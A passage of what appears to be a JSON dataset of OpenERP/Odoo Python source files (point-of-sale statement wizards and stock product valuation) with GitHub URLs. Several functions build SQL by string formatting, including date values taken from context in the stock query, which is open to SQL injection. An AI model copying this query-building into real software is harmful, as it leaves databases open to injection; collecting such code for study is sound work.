        "html_url": " https://github.com/OSSESAC/odoopubarquiluz/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/OSSESAC/odoopubarquiluz/blob/370768e4195059eb21beeb74329566adb110b5a2",
        "file_path": "/addons/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/camptocamp/ngo-addons-backport/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/camptocamp/ngo-addons-backport/blob/e36a9b47a634fc9453ae5602a4ea6fd03879f550",
        "file_path": "/addons/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# 